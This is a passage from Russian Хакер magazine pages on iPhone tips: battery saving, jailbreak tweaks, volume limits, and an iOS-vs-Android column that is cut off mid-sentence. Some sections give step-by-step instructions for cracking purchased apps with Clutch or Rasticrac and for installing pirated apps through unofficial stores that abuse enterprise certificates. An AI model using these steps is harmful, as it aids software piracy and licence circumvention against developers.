 йди в «Настройки -> Основные -> Обнов-
 ление контента» и отключи те приложе-
 ния, фоновое обновление данных которых
 тебя не интересует (например, у себя я
 оставил только погоду и Telegram). Кроме
 того, в самом верху есть главный тумблер,
 позволяющий полностью отключить фоно-
 вое обновление данных для всех.

 11. ОТКЛЮЧАЕМ SIRI
 С выходом русской версии голосовой по-
 мощник от Apple стал очень популярен,                                          Отключаем фоновое обновление
 но он постоянно висит в памяти, готовый
 к работе. Отключить  Siri можно в меню
 «Настройки -> Основные -> Siri».

 12. ОТКЛЮЧАЕМ HANDOFF
 Handoff позволяет синхронизировать работу на различных iДевайсах с помо-
 щью iCloud. Лишний раз подключаться к интернету, зачем? Отключаем: «На-
 стройки -> Основные -> Handoff и предлагаемое ПО».

 13. ОТКЛЮЧАЕМ AIRDROP
 AirDrop — фирменная программа для обмена данными между iPhone, iPad и Mac,
 проверь, не включена ли она. Это можно сделать, вызвав «Пункт управления»
 свайпом снизу вверх, нажав на иконку AirDrop и выбрав пункт «Выключить».

 14. ОТКЛЮЧАЕМ ОТСЛЕЖИВАНИЕ ФИТНЕСА
 В iPhone 5S появился DSP-процессор, отслеживающий движения. Он собирает
 данные о количестве шагов и другую полезную для спортсменов информацию,
 включая трек, записываемый с использованием GPS. Если ты решил не отклю-
 чать геолокацию, то отключи хотя бы эту фичу. Это делается здесь: «Настройки
 -> Конфиденциальность -> Движение и фитнес -> Отслеживание фитнеса».

 15. ОТКЛЮЧАЕМ СКОРОСТНУЮ МОБИЛЬНУЮ СВЯЗЬ
 Развитие мобильных технологий не стоит на месте, появляются новые сотовые
 сети, сначала 3G, а сейчас набирает популярность LTE. Но даже сама Apple
 предупреждает: при использовании сотовых сетей с более высокими скоро-
 стями данные загружаются быстрее, но время работы аккумулятора может со-
 кратиться. Перейти на менее скоростную сеть или полностью отключить сото-
 вые данные — решать тебе. Сделать это можно в меню «Настройки -> Сотовая
 связь». Если хочешь отключить — выключай тумблер «Сотовые данные», а если
 перейти на сеть пониженного уровня, то выбирай меню «Голос и данные».

 16. ОТКЛЮЧАЕМ ЛИШНИЕ ТВИКИ
 «После jailbreak’a мой телефон стал работать медленнее, а батарея садится
 быстрее» — эту фразу можно услышать довольно часто, но давай поставим все
 точки над i. Сам jailbreak никак не влияет на заряд аккумулятора, однако он от-
 крывает доступ ко всем API системы, включая приватные. Многие твики исполь-
 зуют эти API для таких задач, как полная свобода действий в фоне, изменение
 ключевых аспектов работы ОС или включения функций, которые могут привести
 к большей нагрузке на систему. По этой причине не совсем грамотно написан-
 ный твик легко приведет к проседанию батареи.
   Перед установкой нового твика подумай — а нужен ли он тебе? Больше
 всего заряд аккумулятора расходуют всем известные твики Springtomize, на-
 страивающий внешний вид девайса, и Activator, расширяющий функции кнопок
 и жестов. Много энергии уходит на работу твиков, динамично обновляющих ин-
 формацию, например виджетов рабочего стола, живых обоев и модифицирую-
 щихся иконок.

 17. (НЕ) ЗАКРЫВАЕМ СВЕРНУТЫЕ ПРИЛОЖЕНИЯ
 Самый большой спор в Сети вызывает вопрос, нужно ли закрывать свернутые
 приложения, работающие в фоне. Одни кричат, что никакого смысла нет, ведь,
 «засыпая», они никак не расходуют аккумулятор, а другие вопят, что, пока при-
 ложение не закрыто, оно работает, а следовательно, расходует аккумулятор.
 Давай разберемся.
   У приложений в iOS есть пять состояний работы:
 1. Незапущенное — закрыто и никак не проявляет себя (не взаимодействует
   с модулями, не загружает данные из сети).
 2. Неактивное — работает, но не принимает события (например, когда поль-
    зователь заблокировал телефон при запущенном приложении).
 3. Активное — работает в штатном режиме.
 4. Фоновое — закрыто, но продолжает исполнять код.
 5. Приостановленное — занимает память, но процессы не выполняются.

 Что происходит при нажатии кнопки Home во время выполнения приложения?
 Из активного состояния оно переходит в фоновое, а затем — в приостановлен-
 ное. Приостановленные приложения занимают память, но не используют про-
 цессор и не сажают аккумулятор.
   Все приложения работают в состоянии фонового пять секунд. Далее систе-
 ма переводит приложение в состояние приостановленного, но только в том слу-
 чае, если оно не использует специальный API для фонового исполнения. Такие
 API применяют проигрыватели музыки, Skype, ожидающий звонков, карты, мо-
 ниторящие положение с помощью GPS-модуля, а также, например, Twitter-кли-
 ент, обновляющий ленту (но эту функцию, как ты уже понял из советов выше,
 можно отключить).
   Какой же можно сделать вывод, закрывать приложения вручную или нет?
 Простой ответ: нет, система сама разберется. Сложный ответ: зависит от ис-
 пользуемых приложений. Если ты ставишь все из App Store — можешь не вол-
 новаться, найти там пожирателя батареи довольно сложно, а вот владельцам
 смартфонов с jailbreak нужно быть осторожными в выборе софта. В любом слу-
 чае вместо того, чтобы постоянно закрывать приложения, лучше найти «пожи-
 рателя» через «Настройки -> Основные -> Статистика -> Использование акку-
 мулятора» и избавиться от него.

 18. ЮЗАЕМ ТВИК IBATTERYINFOPRO2
 В конце концов, журнал называется ][акер, а все способы сохранения заряда,
 описанные мной, были на 100% легальны. Так дело не пойдет. Представляю
 супертвик iBatteryInfoPro2. Загрузить его можно из стандартного репозитория
 BigBoss, где за него придется выложить 0,99 доллара. Что может этот твик?
 Очень многое. Пойдем по порядку. После его установки, зайдя в настройки, ты
 увидишь вот такую картину:

                                                                      Главное окно
                                                                                 iBatteryInfoPro2





   Пункт первый. Activation Method. Здесь можно выбрать, каким способом
 вызвать уведомление о состоянии аккумулятора с кнопкой перехода в режим
 энергосбережения.
   Пункты второй и третий. Battery and Cable
 informations. В этих двух вкладках можно уви-
 деть полные данные о состоянии аккумулятора
 и кабеля.
   Пункт четвертый. Power  Saving Mode
 Settings. Собственно, ради этого пункта мы
 и ставили твик. Открываем эту вкладку и видим
 кучу настроек! Для начала включи режим Power
 Saving Mode, щелкнув тумблером Enable. За-
 тем выбери заряд батареи, при котором ре-
 жим запустится автоматически. Далее можно
 выбрать, каким способом гаджет уведомит
 тебя о начале работы в режиме PSM: «Уведом-
 ление» или «Вибрация».
   А теперь главное: что произойдет в момент
 активации режима? Можно выбрать из следу-
 ющих пунктов: переход в авиарежим (Airplane
 Mode), отключение Bluetooth, отключение ге-
 олокационных сервисов  (Location  Services)
 и отключение Wi-Fi, кроме этого, можно уста-  Уведомление о состоянии
 новить уровень яркости экрана.

 19. ТВИК POWER SAVER MODE
 В iOS 9 пользователям обещается режим энергосбережения, но до выхода де-
 вятки еще далеко, а батарейка садится сейчас. От этой ужасной несправед-
 ливости поможет избавиться бесплатный твик Power Saver Mode. Его можно
 скачать в репозитории Elijah and Andrew. После установки и респринга устрой-
 ства в разделе «Настройки» появится вкладка Battery, в которой можно вклю-
 чить этот твик.





 Панель настроек с установленным твиком

 На вкладке Power Saving Options можно выбрать, что именно произойдет в мо-
 мент активации режима. Во время работы твика индикатор заряда батареи
 окрашивается в желтый цвет. Основное отличие от iBatteryInfoPro2 — необхо-
 димо самостоятельно включать и отключать режим энергосбережения.

ВЫВОДЫ
 Все описанные способы помогут тебе выстоять в сложный момент или подго-
 товиться к нему. Не забывай заряжать телефон или планшет и всегда таскай
 с собой внешний аккумулятор или как минимум зарядку. Может быть, когда-ни-
 будь возможность зарядить телефон спасет чью-то жизнь. До новых встреч!


 Диагностика аккумулятора

 Со временем аккумулятор теряет свою емкость, и иногда единственный
 способ исправить ситуацию — его заменить. Но как понять, надо менять
 аккумулятор или решать проблему программно? Займемся диагностикой.

СПОСОБ 1. СИСТЕМНЫЙ.
 iOS обладает собственным системным средством для просмотра данных об ис-
 пользовании аккумулятора. Оно располагается по адресу «Настройки -> Основ-
 ные -> Статистика -> Использование аккумулятора». На этой вкладке можно
 увидеть распределение заряда по приложениям в процентном соотношении.

СПОСОБ 2. JAILBREAK TWEAK
 Если на твоем устройстве сделан jailbreak, то диагностировать аккумулятор по-
 может твик с очевидным названием BatteryLife (http://modmyi.com/cydia/com.
 rbt.batterylife). В этой программе можно увидеть, на сколько заряжена батарей-
 ка на данный момент, как уменьшилась емкость по сравнению с изначальной,
 количество циклов зарядки и многое другое

СПОСОБ 2+. РАСШИРЯЕМ СИСТЕМНЫЕ ВОЗМОЖНОСТИ ТВИКОМ
 Помнишь первый способ? Так вот, Apple достаточно серьезно подходит к во-
 просам тестирования, но очень многие функции остаются закрытыми. Твик
 DetailedBatteryUsage, который можно совершенно бесплатно скачать из Cydia,
 открывает нам дали. Кроме того, о чем мы говорили раньше, можно будет уви-
 деть максимально полную и наглядную статистику, например, как расходуют ак-
 кумулятор неактивные приложения и jailbreak-твики. Можно будет посмотреть
 на график заряда-разряда аккумулятора за сутки или за целую неделю.

СПОСОБ 3. КОМПЬЮТЕРНАЯ ДИАГНОСТИКА
 Узнать реальную емкость аккумулятора можно с помощью приложения
 iBackupbot для устройств с jailbreak. Нужно запустить программу, предвари-
 тельно подключив девайс к компу, и на вкладке аппарата нажать ссылку More
 information. В новом окне под заголовком Battery можно найти информацию
 о количестве циклов зарядки (CycleCount), узнать исходную (DesignCapacity)
 и максимально возможную на данный момент (FullChargeCapacity) емкость. Ре-
 сурс батареи высчитывается по формуле: FullChargeCapacity/DesignCapacity *
 100%; если ресурс батареи больше 65%, то волноваться не о чем, в ином слу-
 чае следует подумать о замене аккумулятора.


Режим энергосбережения в iOS 9

 Одна из киллер-фич новой iOS 9, выпуск которой запланирован на сентябрь
 2015 года, — это режим энергосбережения. На официальной страничке iOS
 9 Apple сообщает, что устройства под управлением iOS будут использовать
 датчики освещения и приближения, чтобы определять ориентацию
 в пространстве. Например, если iPhone лежит экраном вниз, то нет никакого
 смысла включать экран, даже если пришло уведомление. Таким образом
 сокращается использование самого «прожорливого» компонента iPhone —
 экрана.
   Собственно сам режим экономии (Low Power mode) уменьшает
 потребление энергии, ограничивая сетевую активность устройства, снижая
 нагрузку на сотовую сеть, отключая анимацию и приглушая яркость экрана.
Mobile
ГОТОВИМ ЯБЛОКИ
    ПРАВИЛЬНО





      СЕМЬ ТРЮКОВ, О КОТОРЫХ
       ДОЛЖЕН ЗНАТЬ КАЖДЫЙ
       ПОЛЬЗОВАТЕЛЬ IДЕВАЙСА





                                     Михаил Филоненко
                                                 mfilonen2@gmail.com





До сих пор существует стереотип о невозможности
тонкой настройки iOS, о ее ограниченности в касто-
мизации, об отсутствии многих стандартных функций
других мобильных ОС. В этой статье я расскажу о не-
скольких трюках, позволяющих расширить возможно-
сти ОС. Мы увеличим громкость устройства в науш-
никах и без них, установим взломанные приложения
и взломаем установленные, откатим прошивку даже
без цифровой подписи SHSH и снизим яркость экра-
на ниже предельного уровня. В качестве бонуса пого-
ворим о скрытых возможностях свежего Apple Music.

УВЕЛИЧИВАЕМ ГРОМКОСТЬ
Порой во время поездок на метро и в людных и шумных местах мы используем
свои iPhone в качестве плеера, часто увеличивая громкость до максимальных
значений. Однако многие владельцы яблочных аппаратов столкнутся с пробле-
мой: увеличить громкость смартфона до предела не получается — часть поло-
ски громкости выделена желтым или красным цветом, и дальше выделенной
черным области ползунок не идет.
  Виной тому законодательство европейских стран. Причем, как показыва-
ет опыт многих пользователей, ограничения в громкости можно преодолеть,
удерживая кнопку Vol+. Основные же проблемы возникают с французски-
ми и британскими версиями аппарата, где выкрутить громкость на максимум
без вмешательства в работу системы не удастся. Исправить это можно, сделав
jailbreak. Благо он уже доступен для всех версий актуальной iOS 8, в том числе
и новейшей 8.4.
   Итак, сперва необходимо получить доступ к файловой системе iOS. Это воз-
можно сделать как с телефона (например, при помощи программы iFile), так
и с компа через iFunbox (потребуется установка твика afc2add, доступного
в стандартном репозитории BigBoss). Также обязательно наличие редактора
файлов настроек .plist.
   Далее   заходим   в   папку   /System/Library/
Frameworks/MediaToolbox.Framework и ищем там файл
RegionalVolumeLimits.plist. В данном файле находим
кодировку страны, для которой был предназначен iPhone.
Можно установить значения до 1.2, но при установке                                                        INFO
на максимум звук потеряет в качестве. Потому рекоменду-
ется установить значение на 1. Сохраняем изменения и пе-            Узнать,
резагружаем устройство — по идее, ограничения должны      для какой страны
                                                                             предназначалосьбыли исчезнуть.                                                                                 устройство, можно
   Теперь по указанному выше пути переходим в папки      по номеру модели
default и Nxx, где xx — номер, индивидуальный для каждой     (приставка перед /A).
модели устройства. Файл SystemSoundMaximumVolume.
plist находится в каждой из них. Открываем данный файл и устанавливаем та-
кие значения: Default — 0.99, Headset — 0,8, LineOut — 0.8. Переходим в пап-
ку /var/mobile/Library/Preferences и открываем файл com.apple.celestial.
plist. Значение VolumeLimits необходимо установить на 1.2. Не забываем после
каждого изменения сохранять его и перезагружать устройство.
   Также громкость разговорного динамика можно увеличить при помощи
твика Volume Amplifier. Твик настолько прост, что даже не имеет собственного
интерфейса: во время разговора продолжай, после заполнения шкалы, уве-
личивать громкость, и появятся дополнительные деления. Разработчик твика
обещает увеличение громкости до 200%, однако лучше не использовать эту
возможность; динамик вполне может износиться значительно быстрее. Уве-
личение же громкости устройства в наушниках (до рекомендуемых пределов)
не принесет никакого вреда аппарату.

ЗАСТАВЛЯЕМ IPAD И IPOD TOUCH ЗВОНИТЬ И ОТПРАВЛЯТЬ СМС
Владельцы iPod Touch мечтают о том, чтобы их плеер работал как полноцен-
ный смартфон. Владельцы iPad хотят этого еще больше, ведь в их девайсах
зачастую есть 3G-модуль. Рассмотрим, каким образом сделать обыкновенные
звонки и отправку текстовых сообщений доступными на данных ограниченных
в возможностях коммуникации устройствах.
  В далеком 2010 году айпадоводы могли использовать твик PhoneItiPad,
позволяющий разблокировать возможность звонков и отправки сообщений.
Однако твик поддерживал только первый iPad, и, очевидно, в новых версиях
«таблетки» функцию звонков заблокировали на аппаратном уровне, улучшив
защиту модема. Так или иначе, аналога твика не появилось, да и разработчики
имеющегося не спешат расширять список поддерживаемых устройств. Однако
звонить с iPad и iPod Touch возможность все-таки есть!
  В первую очередь можно использовать IP-телефонию. Viber, Skype, SipNet
и другие сервисы позволяют совершать звонки в том числе и на обычные со-
товые телефоны. Как правило, услуги связи внутри этих сервисов бесплатны.
Но есть два недостатка: обязательное подключение к интернету и завышенные
тарифы на «внешние» звонки. Поэтому был придуман другой способ, требую-
щий, правда, jailbreak.
   Твик Konect позволяет сопрягать iPod Touch с обычным сотовым телефоном
по Bluetouth и производить переадресацию звонков. Использовать его пре-
дельно просто: связываем устройства по Bluetouth внутри приложения, выби-
раем необходимый номер и звоним — отвечать собеседнику ты сможешь пря-
мо с iPod! Аналогично и при входящем звонке. Если используется связка iPhone
и iPad, возможно наладить переадресацию звон-
ков и сообщений стандартными средствами. Все
благодаря функции  Continuity, введенной еще
в первых версиях iOS 8. Для синхронизации ис-
пользуются   нативные   сервисы   FaceTime
и iMessage. Для подключения опции на обоих
устройствах необходимо включить опцию «Сото-
вые вызовы iPhone» в разделе «FaceTime» прило-
жения «Настройки». Возможно, потребуется вве-
сти код подтверждения. После этого уведомления
о входящих звонках будут отображаться на обоих
устройствах с минимальной задержкой.
   Для того чтобы синхронизировать и тексто-
вые сообщения, перейди в раздел iMessage при-
ложения «Настройки» и выбери «Переадресация
сообщений». После ввода кода подтверждения
на iPad синхронизация также будет происходить
в автоматическом режиме. И помни, что устрой-
ства должны быть привязаны к одному Apple ID,
а сервисы — к одному адресу электронной почты.   Настройка вызовов FaceTime

ВЫТАСКИВАЕМ УСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ
ИЗ ПАМЯТИ УСТРОЙСТВА
Все приложения Apple, купленные в App Store, привязаны к конкретному Apple
ID и не могут быть запущены на устройствах, где аутентификация при помо-
щи данного Apple ID не произведена. Однако запустить приложение, пусть
и с jailbreak, все же возможно (многие пользователи взламывают свои устрой-
ства именно для этого).
   Скачай твик Rasticrac или Clutch. Не забывай, что необходимо устанавли-
вать новейшие версии твиков, их можно найти на сайте iPod-Touch-Max Для за-
пуска понадобится терминал (MobileTerminal или WhiteTerminal). При помощи
команды su и ввода пароля (стандартный — alpine) переключись на суперполь-
зователя. Для запуска Clutch введи команду Clutch или clutch, а для Rasticrac —
rc.sh. После первоначальной конфигурации утилит введи одну из этих команд
и имя приложения (оно отображается в списке). Приложения появятся в папке
/var/root/Documents/Cracked/. Если дамп не удался — попробуй перезагрузить
снова: данные приложения не всегда работают стабильно.

УСТАНАВЛИВАЕМ ПРИЛОЖЕНИЯ В ОБХОД APP STORE
БЕЗ JAILBREAK
В Сети можно найти тысячи взломанных приложений, но без jailbreak их не уста-
новить. Зато есть множество сторонних магазинов софта, которые, как ни стран-
но, могут устанавливать приложения даже на невзломанные устройства. Работа-
ет это благодаря использованию корпоративных сертификатов, не требующих
подписи Apple Store. Изначально Apple придумала такую опцию для корпора-
тивных клиентов, которым был необходим способ распространения своих при-
ложений между сотрудниками в обход App Store, но, как и следовало ожидать,
быстро нашлись те, кто решил использовать данные сертификаты не по назна-
чению. В соглашении Apple такое «мошенничество» запрещено явно, поэтому
периодически она отзывает сертификаты у неофициальных магазинов прило-
жений. Так что если один из магазинов у тебя не установится — просто попро-
буй установить другой.
   Итак, наиболее популярные магазины софта — это Tongbu, vShare и 25PP.
Как правило, сложность установки заключается в китайском интерфейсе дан-
ных утилит. Кроме того, многие из приложений проблематично установить из-
за того, что они созданы только для китайской зоны IP-адресов и могут подклю-
чаться к Сети через прокси-серверы.
   Единственный работающий на новых версиях системы магазин — это Tongbu
(vShare тоже прекрасно  работает. — Прим.  ред.). Существуют версии
для ПК и iOS-устройства, причем последняя может работать автономно. Ска-
чать ее можно с сайта tui.tongbu.com. Сайт на китайском, но это не проблема,
так как достаточно нажать на одну из двух больших кнопок: со значком ананаса
для устройств с jailbreak или значком яблока — для всех остальных. Зайди
на сайт прямо с устройства, нажми на кнопку, за-
тем еще на одну в окне с предупреждением. При-
ложение будет установлено.
   Хотя интерфейс данной программы на китай-
ском, с ее использованием не должно возникнуть
проблем. Перейди в последнюю слева вкладку
(«Инструменты») и кликни на значок лупы («По-
иск»). Введи название необходимого приложения
и дождись, когда закончится его загрузка. Следу-
ет отметить неустойчивую работу магазина. По-
сле отображения результатов найди нужное при-
ложение и кликни на значок с правого края строки.
Вероятно, нажать придется много раз: утилита
крайне нестабильна.
   Когда приложение загрузится, система по-
просит разрешения на установку. Соглашаем-
ся и ждем. Если приложение вылетает, подключи
iPhone (iPad) к компьютеру и запусти десктопную
версию Tongbu. Выбери на вкладке устройств
Genuine App и подтверди действие. После исправ-   Поиск в Tongbu
ления ошибок приложения уже не будут вылетать.

ПОНИЖАЕМ ЯРКОСТЬ НИЖЕ ПРЕДЕЛЬНОГО
УРОВНЯ БЕЗ JAILBREAK
Несмотря на то что уровень яркости на устройствах Apple можно отрегулиро-
вать в больших пределах, для кого-то даже самого минимального значения мо-
жет не хватить. Поэтому Apple создала полускрытую возможность установить
яркость меньше предела, для использования в темноте например. Перейди
в «Настройки» и выбери «Основные», а затем указанный выше раздел. Включи
функцию «Увеличение» и нажми овал внизу лупы. В появившемся меню нажми
«Выбрать фильтр» и «Слабый свет». А затем просто уменьши увеличение до ми-
нимума, чтобы лупы не было видно, предварительно растянув ее на весь экран.
   Для того чтобы функцию можно было быстро вызвать, ее надо установить
для трех касаний Home. Вернись в «Универсальный доступ», выбери «Сочета-
ния клавиш», а затем «Увеличение».


                                                            Опции окна
                                                                 «Увеличение»





                                                           INFO

                                                                     В окне
                                                                                   увеличения
                                                                                        есть и другие
                                                                                полезные
                                                                                    функции:
                                                                                 инвертирование,
                                                                                         оттенки
                                                                                        серого, показ
                                                                                   контроллера
                                                                                     инструмента.

ОТКАТЫВАЕМ ПРОШИВКУ IPHONE 4 ПРИ ПОМОЩИ SHSH
Несмотря на то что iPhone 4 появился на рынке пять лет назад, многие про-
должают им пользоваться. Однако iOS 7 на данном аппарате работает далеко
не так хорошо как на более современных моделях. И это уже не говоря о новом
плоском дизайне, ставшем камнем преткновения для десятков тысяч пользо-
вателей (да ладно, все уже привыкли. — Прим. ред.). Что делать? Конечно, от-
катываться на проверенную временем iOS 6.
   Однако самостоятельно это сделать не получится. Дело в том, что для пере-
прошивки необходимо подтверждение от Apple — специальный код, цифровая
подпись SHSH. После того как сервисы перестали «подписывать прошивку»,
откатиться на большинстве устройств оказалось невозможным. Однако даже
если возможность официальной перепрошивки закрыта, остается шанс отка-
титься на последнюю «скевоморфическую» ОС от Apple! Все из-за того, что
iPhone 4 — последний эппловский смартфон с критической уязвимостью iBoot,
позволяющей теоретически загружать любую прошивку. С одним но — прошив-
ка привязана, и при выключении аппарата вернуть его к жизни получится только
при помощи специальной программы.
   Итак, необходимо использовать программу IREB и iTunes версии не выше
11.0.5. Перед началом прошивки необходимо скачать саму ОС. По указанной
ссылке файлы GeekGrade.ipsw нужны для установки прошивки, а Boot.ipsw —
для загрузки при помощи redsn0w.
   Запусти IREB и переведи девайс в режим Pwned DFU. Теперь открой iTunes
и при помощи функции «Восстановление» сделай перепрошивку на необходи-
мую версию системы. Если устройство было выключено после перепрошивки,
загрузить его поможет redsn0w. Для этого подключи устройство к компьютеру,
зайди в меню Extracts программы, нажми Select IPSW и выбери прошивку. Затем
выбери опцию Just Boot. Можно установить и jailbreak при загрузке, но только
привязанный. Теперь введи устройство в DFU (десять секунд удерживай Home
и Power, затем только Power) и жди загрузки.
  Не забывай, что перед даунгрейдом лучше перепрошиться на «чистую» вер-
сию системы, это поможет избежать многих ошибок. Также при вводе в режим
DFU программой IREB необходимо выключить устройство, иначе после даун-
грейда экран может начать рябить.

СКРЫТЫЕ ВОЗМОЖНОСТИ СЕРВИСА
APPLE MUSIC
Музыкальный сервис Apple появился совсем не-
давно, но пользователи уже отметили, что он со-
всем не такой простой, как может показаться
на первый взгляд. В сервис добавили большое ко-
личество функций, и часть из них оказалась в глу-
бине настроек и меню.
  В первую очередь многих интересует, как отка-
заться от продления подписки. После окончания
бесплатного трехмесячного периода за исполь-
зование сервиса будет взыматься по 169 рублей
в месяц. Для отмены подписки есть несколько
возможностей. Перейди в раздел «iTunes Store
и App Store» приложения «Настройки» и выбери
«Просмотреть Apple ID». Нажми «Управлять под-
писками» и отключи «Автовозобновление». Ана-
логичную операцию можно провести и через само
приложение «Музыка». Для этого перейди в про-   Сброс подписки Apple Music
грамму и выбери значок учетной записи в левом
верхнем углу. Далее инструкция аналогична пер-
вой: выбери «Просмотреть…», затем «Управлять»
и отмени «Автовозобновление».
  Можно также по отдельности отключить неко-
торые компоненты сервиса. Например, для де-
активации опции «Для Вас», где подбирается
музыка, необходимо перейти в настройки музы-
ки и выключить Apple Music. Для того чтобы вы-
ключить социальную сеть Сonnect, можно вос-
пользоваться функцией «Ограничения». Перейди
в «Настройки», выбери соответствующий раздел
и найди в нем пункт «Подключение к Apple Music».
Видимо, при русификации разработчики оши-
блись, ведь в оригинале данный пункт называется
Apple Music Connect.
   Сервис Apple Music в подборке композиций
очень интерактивен, и, если результат первона-
чальной подборки не понравился, его можно из-
менить. Нажми на плей-листе и из появившегося   Окно «Далее», история
меню выбери «Меньше похожих рекомендаций».   прослушанного
В самом альбоме данный пункт не работает. Если
ты упустил момент, когда прослушивал понравив-
шуюся музыку и теперь играет другая песня, —
не беда, ведь в сервисе доступна история прослу-
шанных композиций. Найти ее можно в разделе
«Далее» при открытии плеера на весь экран (зна-
чок справа от кнопки «Вперед»).
  Каждый новый сервис Apple интегрируется
с Siri, и этот не стал исключением. Так, кроме стан-
дартных голосовых команд, есть возможность
распознать песню. Просто включи Siri и необхо-
димую музыку, а затем задай вопрос: «Кто поет?»
Голосовой ассистент предложит свои варианты,
которые можно прослушать, лайкнуть или скачать
на устройство. Другая фишка Siri — воспроизве-
дение не только песен, но и звуков, встроенных
в сервис. Поэкспериментируй, попросив асси-
стента проиграть какие-либо звуки — их коллек-
ция здесь очень большая.
                                                   Распознание песни Siri

НАРЕЗАЕМ СОБСТВЕННЫЙ РИНГТОН
Методов создания рингтона на iPhone несколько: при помощи iTunes, приложе-
ний и онлайн-сервисов, а также при помощи джейлбрейк-твиков. Рассмотрим
каждую из данных возможностей.
Первый. Залей необходимый трек в медиатеку iTunes. Нажми на трек правой
кнопкой и выбери «Сведения», а затем — «Параметры». Здесь отрегулируй
длину записи. Для того чтобы появилась возможность поставить данный трек
в качестве рингтона, его длина должна быть не более 30 с. Теперь стандартны-
ми средствами iTunes конвертируй музыку в формат AAC. Пере-
йди к файлу в файловой системе и измени его расширение
на m4r. Теперь удали исходный файл из медиатеки, а новый до-
бавь. Рингтон готов. Осталось только подключить устройство,
выбрать вкладку «Звуки», нажать «Добавить» в верхнем правом
углу и найти запись. После этого рингтон станет доступен,
как и все стандартные, в настройках звуков.                                     WWW
Второй. Поставить рингтон без компьютера даже со сторон-
ними приложениями не удастся. Зато можно обрезать мело-              iFile
дии, одновременно сконвертировав их, например на сайте         iFunbox
MP3Cut. Скачай туда файл и обрежь его, а затем нажми «Ринг-
                                                                                      BigBoss
тон для iPhone». Затем появится возможность скачать запись.
После открой iTunes, добавь его в медиатеку и синхронизируй    Volume Amplifier
ее. Или перетащи в соответствующую вкладку iPhone, в зависи-                                                                                GeekGrade
мости от настроек.
                                                                                    IREBТретий. Разработчики твиков реализовали еще более про-
стое решение. Среди нескольких твиков для установки мелодий     Tui.tongbu.com
на звонок можно выделить AudioExplorer+. Просто скачай твик                                                                              25PP
и подожди, пока он отсканирует всю медиатеку аппарата. С вы-
                                                                                    Tongbuбранными мелодиями можно будет совершать любые операции
через настройки твика, в том числе и поставить их в качестве         vShare
рингтона.
X-Mobile

Колонка Евгения Зобнина




                                                Евгений Зобнин
                                                                      androidstreet.netТЕПЛОЕ
И МЯГКОЕ
Каждый раз, когда я слышу разглагольствования о том, на-
сколько лучше или хуже iOS в сравнении с Android, когда на-
чинается спор о плавности работы системы, о ее потребле-
нии аккумулятора, о наличии или отсутствии вирусов, мне
хочется взять книжку Эндрю Таненбаума в твердом пере-
плете и дать ей по головам обоих спорщиков. А потом под-
нять их с земли (Таненбаум писал толстые тяжелые книги)
и отправить по домам пить чай и смотреть телевизор, ибо
сравнивать iOS и Android может только технически неграмот-
ный человек.





На самом деле я, конечно же, далеко не так жесток, но подобного рода спо-
ры настолько надоели, что пусть я лучше вылью всю свою внутреннюю желчь
в словах. Итак, я считаю, что сравнивать iOS и Android нельзя ни при каких об-
стоятельствах. То есть да, конечно, можно сравнить рабочий стол, шторку, ко-
личество приложений в маркетах и прочие лежащие на поверхности и, по сути,
ничего не значащие вещи. А вот если копнуть немного глубже и постараться по-
нять причины некоторых фундаментальных различий этих ОС, то картина ста-
новится далеко не такой черно-белой и мы придем к выводу, что iOS и Android
просто-напросто рассчитаны на разные целевые аудитории. И это отражается
далеко не только на цене устройств, их дизайне и встроенной оболочке.

СКОРОСТЬ
Возьмем, к примеру, едва ли не самый главный козырь приверженцев iOS —
скорость работы операционной системы. При первом знакомстве с iOS плав-
ность ее работы действительно поражает, особенно если это знакомство про-
изошло во времена Android 2.3. iOS не просто быстрая и плавная, это какое-то
интерактивное кино, в которое с непривычки можно надолго залипнуть. Од-
нако если разобраться, за счет чего была достигнута такая плавность работы,
все становится куда менее радужным.
   Скорость интерфейса была главным приоритетом при разработке iOS.
Apple в лице Стива Джобса была готова пойти на все, чтобы визуально сделать
работу системы безупречной. Поэтому с самых первых версий (когда система
еще носила имя iPhone OS) iOS полностью полагалась на 3D-ускоритель во
всем, что касается вывода картинки на экран. С самого начала архитектура
операционки предполагала наличие системного процесса отрисовки с мак-
симальным приоритетом перед другими процессами системы, и с самого же
начала iOS была во многом однозадачной системой. Все ради того, чтобы ни-
что и никто не мог отнять процессор у главного процесса, занимающегося от-
рисовкой интерфейса.
   Первая версия iOS вообще не поддерживала установку сторонних приложе-
ний (если не брать в расчет неофициальную Cydia). Такая возможность появи-
лась только в 2.0, и она вообще не предполагала работу установленных прило-
жений в фоне. Любое «свернутое» приложение фактически замораживалось,
а затем вычищалось из памяти при ее нехватке. Никаких фоновых обновлений
данных, никаких синхронизаций, никаких почтовых клиентов с проверкой по-
чты в фоне. Приложение работает только до тех пор, пока оно на экране. Толь-
ко в iOS 4.0 Apple сделала поблажку и добавила ограниченный ряд системных
API, которые приложения могли использовать для выполнения узкого круга за-
дач в фоне. Теперь сторонний софт мог получать push-уведомления, отслежи-
вать положение устройства, проигрывать музыку, а в iOS 7.0 еще и загружать
данные из сети в фоне. Но на этом все, ничего больше.
  При разработке Android приоритеты были совсем иные. Главная задача
Google состояла в том, чтобы создать ОС, которая была бы способна работать
на устройствах самых разных производителей и самого разного ценового ди-
апазона. По этой причине в Android была задействована ненавистная многим
виртуальная машина Dalvik, абстрагирующая приложения от типа процессо-
ра и снимающая с разработчиков обязанности поддерживать код для разных
процессорных архитектур. По этой же причине изначально Android не поддер-
живала вывод 2D-графики с использованием 3D-ускорителей. На первых по-
рах нишей Android должны были стать бюджетные устройства, а в 2007–2008
годах ускорители в них попросту не устанавливали.
   Второй изюминкой Android должна была быть «десктопная сущность» ОС.
Другими словами, ОС не должна была ограничивать пользователей и разра-
ботчиков в чем бы то ни было. Все было как на компе. Хочешь — ставишь при-
ложения откуда угодно, хочешь — сворачиваешь приложение, и оно спокойно
продолжает работать в фоне и заниматься своими делами. Не нравится стан-
дартный рабочий стол — меняешь его на другой, так же как и многие другие
компоненты системы.
  Именно «открытость» системы и отсутствие хардварного ускорения (а
не пресловутый Dalvik и «неоптимизированность») прочно закрепили за Android
репутацию неповоротливого монстра. Там, где в iOS открытое в данный момент
приложение фактически забирало в личное использование процессор и уско-
ритель, в Android оно делило их (а точнее, только процессор в Android ниже 4.0)
с множеством других приложений и сервисов, которые могли работать в фоне.
Позже, однако, Google начала стремительно наверстывать упущенное, и поя-
вившаяся в 4.0, а затем улучшенная в 4.1 поддержка хардварного ускорения
сделала работу интерфейса гораздо более гладкой. Однако то тут, то там воз-
никающие фризы (вызванные фоновыми приложениями и сервисами) продол-
жали давать о себе знать. Где-то на рубеже версий 4.4–5.0 Google занялась
